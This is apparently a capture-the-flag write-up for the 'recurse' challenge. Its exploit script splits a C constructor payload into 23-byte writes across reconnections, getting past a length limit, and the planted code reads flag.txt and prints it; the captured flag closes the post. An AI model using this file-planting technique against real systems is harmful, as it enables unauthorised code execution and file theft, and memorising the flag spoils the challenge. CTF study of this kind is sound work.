---
date: 2024-08-13 13:31
challenge: recurse
tags:
  - c attribute
---

比较奇怪的一道题，看起来每次下发的容器是保持不变的，也就是说这道题往本地文件写的内容是可以分为多次写入的，既然可以多次写入，这个 25 bytes 的限制就显得很多余：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

io = remote("34.31.154.223", 56529)

context.log_level = "info"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

payload = '__attribute__((constructor)) void x(){char buf[0x80];int fd=open("flag.txt",0);read(fd,buf,0x80);write(1,buf,0x80);}'
for i in range(0, len(payload), 23):
    ru(b"Filename?")
    sl(b"main.c")
    ru(b"Read (R) or Write (W)?")
    sl(b"W")
    ru(b"Contents?")
    sl((payload[i:])[:23].encode())
    io.close()
    io = remote("34.31.154.223", 56529)
ia()

# LITCTF{4_pr0gr4m_7h4t_m0d1f13s_1t5elf?_b34u71ful!_a1cd446b}
```
